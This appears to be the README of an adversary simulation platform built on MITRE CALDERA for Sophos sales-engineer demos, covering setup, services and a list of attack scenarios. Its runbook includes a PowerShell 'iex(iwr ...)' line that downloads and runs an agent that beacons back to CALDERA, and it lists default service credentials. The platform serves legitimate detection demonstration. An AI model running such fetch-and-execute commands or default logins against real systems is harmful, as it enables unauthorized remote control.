<p align="center">
  <img src="https://www.sophos.com/sites/default/files/sophos-logo-white-bg.png" alt="Sophos" width="200"/>
</p>

<h1 align="center">Sophos Adversary Simulation Platform</h1>

<p align="center">
  Live attack simulation for Sophos Sales Engineers, powered by MITRE CALDERA.<br/>
  Deploy. Simulate. Demonstrate. Defend.
</p>

<p align="center">
  <a href="#quick-start">Quick Start</a> &bull;
  <a href="#scenario-library">Scenarios</a> &bull;
  <a href="#demo-runbook">Demo Runbook</a> &bull;
  <a href="#troubleshooting">Troubleshooting</a>
</p>

---

## What You Get

- **MITRE CALDERA 5.1.0** — Full adversary emulation server with pre-loaded attack profiles
- **6 Pre-Built Scenarios** — Ready-to-run attack chains mapped to MITRE ATT&CK (SCN-001 through SCN-008)
- **AI-Enriched Scenario Generation** — Multi-provider AI (Anthropic, OpenAI, Gemini, or Ollama) for scenario intelligence, analyst notes, and enrichment data
- **SE Console** — Browser-based front-end for launching and monitoring demos (served via nginx)
- **Browser-Based RDP** — Apache Guacamole for in-browser access to victim VMs (standalone mode)
- **Kali Attacker Node** — Pre-configured Kali Linux container with Impacket, CrackMapExec, Nmap, and more
- **Atomic Red Team Runner** — Containerized ART test execution engine
- **n8n Workflow Automation** — Scenario enrichment, config API, and case ingest pipelines
- **Smart Install** — `make install` auto-detects if LabOps is running and adapts networking and services accordingly
- **Auto-Generated Crypto Keys** — CALDERA `crypt_salt` and `encryption_key` are generated on first install (no hardcoded secrets)

---

## Architecture

```
                         Sophos Adversary Simulation Platform
  ┌──────────────────────────────────────────────────────────────────────────┐
  │                                                                        │
  │   ┌──────────────┐    ┌──────────────┐                                │
  │   │   nginx      │    │   CALDERA    │       ┌────────────────┐       │
  │   │  SE Console  │    │  Adversary   │       │    Ollama      │       │
  │   │  :8081       │───▶│  Emulation   │       │    (Host)      │       │
  │   │              │    │  :8888       │       │    :11434      │       │
  │   └──────────────┘    └──────┬───────┘       └────────────────┘       │
  │                              │                                        │
  │   ┌──────────────┐    ┌──────▼───────┐                                │
  │   │   Kali       │    │  Atomic      │                                │
  │   │  Attacker    │    │  Runner      │                                │
  │   │  :2222 (SSH) │    │              │                                │
  │   └──────────────┘    └──────────────┘                                │
  │                                                                        │
  │   ┌─ Standalone Mode Only ──────────────────────────────────────────┐   │
  │   │  ┌──────────────────────────┐                                   │   │
  │   │  │   n8n                    │                                   │   │
  │   │  │  Workflow Automation     │                                   │   │
  │   │  │  :5679                   │                                   │   │
  │   │  └──────────────────────────┘                                   │   │
  │   │  ┌──────────┐  ┌──────────┐  ┌──────────────┐                  │   │
  │   │  │ Guacamole │  │  guacd   │  │  PostgreSQL  │                  │   │
  │   │  │  :8085    │──│  proxy   │  │  (guac-db)   │                  │   │
  │   │  └──────────┘  └──────────┘  └──────────────┘                  │   │
  │   └─────────────────────────────────────────────────────────────────┘   │
  │                                                                        │
  │   Container prefix: advsim-*                                           │
  │   Network: advsim-net (standalone) | labops-net (with LabOps)          │
  └──────────────────────────────────────────────────────────────────────────┘
```

### Three-Repo Model

This project is part of a modular architecture for Sophos SE demo environments:

| Repo | Purpose | Status |
|------|---------|--------|
| `mdr-demo-lab` | Original monolith (all-in-one demo lab) | Legacy |
| `labops` | Lab lifecycle manager (VMs, networking, Guacamole) | Standalone tool |
| **`adversary-sim`** | **Attack simulation platform (this repo)** | **Standalone or modular** |

`adversary-sim` runs independently or plugs into a LabOps-managed environment. The installer detects which mode to use automatically.

---

## Prerequisites

| Requirement | Notes |
|-------------|-------|
| **Docker** | Docker Desktop (macOS/Windows) or Docker Engine (Linux). Ensure Compose V2 is available (`docker compose version`). |
| **AI Provider** (one of) | **Anthropic** / **OpenAI** / **Google Gemini** API key, **or** [Ollama](https://ollama.com) (free, local). Selected during `make install`. |
| **GHCR Access** | The CALDERA image is hosted on a private GitHub Container Registry. Authenticate before install (see below). |
| **Python 3** | Required for profile loading and library build scripts |

### Windows (WSL 2)

On Windows, run everything inside WSL 2 (Windows Subsystem for Linux):

**One-time setup (PowerShell as Administrator):**
```powershell
wsl --install        # Installs WSL 2 + Ubuntu (reboot when prompted)
```

Then install [Docker Desktop for Windows](https://docs.docker.com/desktop/install/windows-install/) and enable **WSL 2 backend** + **Ubuntu integration** in Settings → Resources → WSL Integration.

**Install (Ubuntu terminal):**
```bash
git clone https://github.com/jclark2496/adversary-sim.git
cd adversary-sim
./setup-wsl.sh       # Installs make/pip3, verifies Docker, runs make install
```

All `localhost` URLs (e.g., `http://localhost:8081`) work from your Windows browser.

> **Ollama users:** Install Ollama on Windows (not inside WSL 2). Docker containers reach it via `host.docker.internal:11434`.

### Authenticate to GHCR

The CALDERA image (`ghcr.io/jclark2496/caldera:5.1.0`) is pulled from a private registry. Authenticate first:

```bash
gh auth refresh -s read:packages
echo $(gh auth token) | docker login ghcr.io -u <your-github-username> --password-stdin
```

---

## Quick Start

**Standalone install** (no LabOps needed):

```bash
# 1. Clone the repo
git clone https://github.com/jclark2496/adversary-sim.git
cd adversary-sim

# 2. Copy and configure environment
cp .env.example .env
# Edit .env — set N8N_PASSWORD at minimum

# 3. Install everything
make install
```

That's it. The installer will:

1. Verify Docker is running and prompt you to choose an AI provider
2. Generate `.env` from template if needed
3. Auto-detect whether LabOps is running
4. Generate unique CALDERA crypto keys (`crypt_salt` and `encryption_key`)
5. Pull the CALDERA image from GHCR
6. Start all containers (including Guacamole in standalone mode)
7. Wait for CALDERA to pass health checks
8. Cross-compile the sandcat agent for Windows
9. Load all adversary profiles and scenarios
10. Build the MITRE ATT&CK technique index

---

## AI Provider Configuration

During `make install`, you'll be asked to choose your AI provider:

| Option | Provider | Requires | Quality |
|---|---|---|---|
| 1 | **Anthropic Claude** (recommended) | API key | Excellent |
| 2 | **OpenAI** | API key | Excellent |
| 3 | **Google Gemini** | API key | Good |
| 4 | **Ollama** (local) | Nothing — auto-installed | Good (free, private) |
| 5 | **Skip** | — | Configure later in Settings |

You can change your AI provider anytime via the Settings gear icon in the SE Console header.

---

## With LabOps

If you already have [LabOps](https://github.com/jclark2496/labops) running, `make install` will detect it automatically and:

- **Skip Guacamole** — uses LabOps' existing Guacamole instance
- **Skip n8n** — imports adversary-sim workflows into LabOps' n8n instance
- **Join `labops-net`** — containers connect to the shared Docker network instead of creating their own
- **Share services** — nginx proxies are auto-configured to point at LabOps' infrastructure

No extra flags needed. Just run `make install` from the `adversary-sim` directory and the detection script handles the rest. A `.labops-mode` file is written to record the detected mode.

After installing both projects, configure the Lab Manager URL in the SE Console:
1. Click the gear icon in the header
2. Enter your LabOps dashboard URL (e.g., `http://localhost:8080`)
3. Click Test to verify connectivity
4. Click Save

To force standalone mode even when LabOps is running, remove the `.labops-mode` file and set the network manually in `docker-compose.override.yml`.

### Network Configuration

**Note:** `make install` generates `docker-compose.override.yml` (gitignored) to configure networking.
If you switch between standalone and LabOps modes, delete `.labops-mode` and run `make install` again.

---

## Service URLs

| Service | URL | Default Credentials |
|---------|-----|---------------------|
| **CALDERA** | `http://localhost:8888` | `red` / `admin` |
| **SE Console** | `http://localhost:8081` | None |
| **n8n** | `http://localhost:5679` | Set in `.env` (`N8N_USER` / `N8N_PASSWORD`) |
| **Guacamole** | `http://localhost:8085/guacamole` | `guacadmin` / `guacadmin` (standalone only) |
| **Kali SSH** | `ssh root@localhost -p 2222` | `root` / `kali` |
| **Ollama** (if selected) | `http://localhost:11434` | None (runs on host) |

> **Note:** Replace `localhost` with `<your-host-ip>` when accessing from victim VMs or remote machines.

---

## Make Targets

| Target | Description |
|--------|-------------|
| `make install` | Full first-time setup (run once) |
| `make up` | Start all containers (auto-detects LabOps mode) |
| `make down` | Stop all containers |
| `make restart` | Restart all containers |
| `make status` | Show container health |
| `make logs` | Tail all container logs |
| `make sandcat` | Cross-compile `sandcat.go-windows` for AMD64 |
| `make profiles` | Load CALDERA profiles and adversaries |
| `make library` | Rebuild `caldera-library.json` from profiles |
| `make mitre-update` | Rebuild `mitre-attack.json` from MITRE ATT&CK data |
| `make clean` | Remove all containers and volumes (**destructive**) |

---

## Scenario Library

Six pre-built attack scenarios, each mapped to real-world MITRE ATT&CK techniques:

| ID | Name | MITRE Tactics | Description |
|----|------|---------------|-------------|
| **SCN-001** | Credential Dumping via LSASS | Credential Access | Dumps credentials from LSASS memory using native Windows tools |
| **SCN-002** | Discovery & Enumeration Chain | Discovery | Post-compromise discovery — system, network, and domain enumeration |
| **SCN-003** | Phishing to Payload to Persistence | Initial Access, Execution, Persistence | Phishing-initiated compromise with payload drop and persistence installation |
| **SCN-005** | Pass the Hash Lateral Movement | Lateral Movement | NTLM hash-based lateral movement across the environment |
| **SCN-006** | PowerShell Execution & AMSI Bypass | Execution, Defense Evasion | PowerShell abuse with AMSI bypass techniques |
| **SCN-008** | Ransomware Pre-Deployment Simulation | Impact | Four-phase pre-deployment sequence used by ransomware operators |
| **SCN-010** | NDR: Brute Force Simulation | Credential Access | Rapid connection attempts to authentication services (SSH, RDP, SMB, etc.) |
| **SCN-011** | NDR: UDP Data Exfiltration | Exfiltration | High-volume UDP data transfer to suspicious external IP |
| **SCN-012** | NDR: Web Application Attacks | Initial Access | XSS, SQL injection, RCE injection, and credential leak payloads via HTTP |
| **SCN-013** | NDR: Bad User-Agent (Log4Shell) | Command and Control | Log4Shell-like JNDI User-Agent string in HTTP request |
| **SCN-014** | NDR: Suspicious Exploit URL | Initial Access | Exploit kit URL pattern detection |
| **SCN-015** | NDR: Network Port Scan | Discovery | TCP port scan across subnet (45 ports × 10 hosts) |

> Endpoint scenarios (SCN-001–008) trigger Sophos Endpoint detections. NDR scenarios (SCN-010–015) trigger Sophos NDR network-level detections.

> Scenarios are defined as CALDERA adversary profiles in `caldera-profiles/adversaries/` with matching abilities in `caldera-profiles/abilities/`.

---

## Demo Runbook

### 1. Prepare the Environment

```bash
make up          # Start all services
make status      # Verify everything is healthy
```

### 2. Deploy the Sandcat Agent

On the **victim Windows VM**, open PowerShell as Administrator and run:

```powershell
powershell -c "iex(iwr 'http://<your-host-ip>:8081/s.ps1' -UseBasicParsing)"
```

This downloads and executes the sandcat agent, which beacons back to CALDERA.

### 3. Verify the Agent

Open the CALDERA UI at `http://localhost:8888`:

1. Log in with `red` / `admin`
2. Navigate to **Agents** — your victim should appear within 30 seconds
3. Note the agent's `paw` identifier

### 4. Launch a Scenario

1. Navigate to **Operations** in CALDERA
2. Click **Create Operation**
3. Select an adversary profile (e.g., `SCN-001 | Credential Dumping via LSASS`)
4. Select the agent group
5. Click **Start**

### 5. Monitor in the SE Console

Open `http://localhost:8081/console.html` to watch the attack unfold in real time. The console shows:

- Active operations and their progress
- Techniques being executed (mapped to MITRE ATT&CK)
- Detection events from Sophos endpoint protection

### 6. Show the Sophos Response

Switch to the Sophos Central console to demonstrate:

- Real-time detection alerts
- Threat case creation
- MDR analyst response workflow

---

## n8n First Login

On first launch after `make install`, n8n requires a one-time owner account setup:

1. Open n8n at `http://localhost:5679`
2. Create an owner account:
   - **Email:** any email (e.g., `admin@lab.local`)
   - **Password:** `SEdemo2026` (recommended — matches other service defaults)
   - **First/Last name:** anything
3. Workflows are auto-imported and activated during `make install` — you should see them in the workflow list

> **With LabOps:** If LabOps is running, adversary-sim shares LabOps' n8n instance (port 5678).
> Your attack sim workflows are automatically imported into it — no separate n8n account needed.

This is a one-time setup. After creating the account, n8n will go straight to the dashboard on future visits.

## n8n Workflows

Five automation workflows power the platform. They are auto-imported during `make install`:

| Workflow | What it does |
|----------|-------------|
| **Case Ingest** (`case_ingest.json`) | SE submits a plain-language MDR case via "Submit MDR Case" in the SE Console. n8n sends it to the configured AI provider (Anthropic/OpenAI/Gemini/Ollama), which generates a structured attack scenario with MITRE ATT&CK techniques, expected detections, industry talking points, and an SE runbook. The new scenario appears in the catalog. |
| **Scenario Enrichment** (`export_enrichment.json`) | SE clicks "Enrich with AI" on an existing scenario. The AI provider adds industry-specific talking points, enhanced descriptions, and detection context. |
| **Scenario Approve** (`scenario_approve.json`) | Admin reviews AI-generated scenarios in the Admin Console (`admin.html`) and approves or rejects them. Approved scenarios are published to the catalog. |
| **Config API** (`config_api.json`) | Returns Guacamole credentials and victim VM credentials to the front-end so secrets aren't hardcoded in HTML. |
| **Settings API** (`settings_api.json`) | Powers the Settings modal (gear icon in header). Reads/writes `ai-config.json` with AI provider, API key, model, and Lab Manager URL. |

---

## Troubleshooting

### CALDERA won't start or stays unhealthy

```bash
docker compose logs -f caldera
```

Common causes:
- Port 8888 already in use: `lsof -i :8888`
- Image not pulled: `make _pull-caldera` or check GHCR auth
- Corrupt data volume: `docker volume rm adversary-sim_caldera-data`

### Sandcat agent won't connect

- Ensure the victim VM can reach `<your-host-ip>:8888` (ports 7010-7012 are also used for agent comms)
- Check Windows Firewall is not blocking outbound connections
- Verify the agent binary was compiled: `make sandcat`

### AI enrichment not working

- Check your AI provider setting in the Settings modal (gear icon in SE Console header)
- **Ollama**: Confirm Ollama is running (`curl http://localhost:11434/api/tags`) and model is pulled (`ollama list`)
- **Cloud providers**: Verify your API key is correct in Settings or `.env` (`AI_API_KEY`)
- n8n connects to Ollama via `host.docker.internal:11434` — ensure Docker Desktop's host networking is enabled

### Guacamole not accessible

- Only available in **standalone mode** (not when LabOps is detected)
- Check the mode: `cat .labops-mode`
- Verify the guac stack: `docker ps | grep advsim-guac`

### GHCR authentication failed

```bash
# Re-authenticate
gh auth refresh -s read:packages
echo $(gh auth token) | docker login ghcr.io -u <your-github-username> --password-stdin

# Verify
docker pull ghcr.io/jclark2496/caldera:5.1.0
```

### Clean reset

```bash
make clean       # Removes all containers and volumes (prompts for confirmation)
make install     # Reinstall from scratch
```

---

## Project Structure

```
adversary-sim/
├── Makefile                          # All make targets (install, up, down, etc.)
├── docker-compose.yml                # Core services (CALDERA, nginx, Kali, Atomic Runner)
├── docker-compose.n8n.yml            # n8n stack (standalone mode only)
├── docker-compose.guacamole.yml      # Guacamole stack (standalone mode only)
├── docker-compose.override.yml       # Auto-generated network config (do not edit)
├── .env                              # Environment variables (N8N_PASSWORD, ports, etc.)
├── .env.example                      # Template for .env
├── .labops-mode                      # Auto-detected mode: "standalone" or "labops"
│
├── caldera/
│   └── conf/
│       └── local.yml                 # CALDERA config (crypto keys auto-generated)
│
├── caldera-profiles/
│   ├── adversaries/                  # Scenario definitions (SCN-001 through SCN-008)
│   │   ├── scn001-credential-dumping.json
│   │   ├── scn002-discovery-chain.json
│   │   ├── scn003-phishing-persistence.json
│   │   ├── scn005-pass-the-hash.json
│   │   ├── scn006-powershell-amsi-bypass.json
│   │   └── scn008-ransomware-simulation.json
│   ├── abilities/                    # Individual ATT&CK technique implementations
│   │   ├── credential-access/
│   │   ├── defense-evasion/
│   │   ├── discovery/
│   │   ├── execution/
│   │   ├── impact/
│   │   ├── lateral-movement/
│   │   └── persistence/
│   └── load_profiles.py              # Script to load profiles into CALDERA via API
│
├── n8n/
│   └── workflows/                    # n8n workflow definitions
│       ├── case_ingest.json
│       ├── config_api.json
│       ├── export_enrichment.json
│       ├── scenario_approve.json
│       └── settings_api.json
│
├── nginx/
│   ├── html/                         # SE Console front-end
│   │   ├── index.html
│   │   ├── console.html
│   │   ├── admin.html
│   │   ├── s.ps1                     # Sandcat deployment script
│   │   ├── ai-config.json            # AI provider config (gitignored, runtime)
│   │   ├── caldera-library.json      # Scenario index (built by make library)
│   │   ├── mitre-attack.json         # ATT&CK technique index
│   │   └── scenarios.json
│   └── conf/
│       └── default.conf              # Nginx reverse proxy config
│
├── atomic-runner/                    # Atomic Red Team test runner container
│   ├── Dockerfile
│   ├── tests/
│   └── results/
│
├── guacamole/                        # Guacamole init scripts (standalone mode)
│   └── init/
│
├── kali/                             # (configured inline in docker-compose.yml)
│
└── scripts/
    ├── detect-labops.sh              # LabOps detection script
    ├── build-library.py              # Builds caldera-library.json
    └── build-mitre-attack.py         # Builds mitre-attack.json from ATT&CK data
```

---

## License

MIT License. See [LICENSE](LICENSE) for details.

---

<p align="center">
  <strong>Sophos Adversary Simulation Platform</strong><br/>
  Built for Sophos Sales Engineers &bull; Powered by MITRE CALDERA<br/>
  <a href="https://github.com/jclark2496/adversary-sim">github.com/jclark2496/adversary-sim</a>
</p>
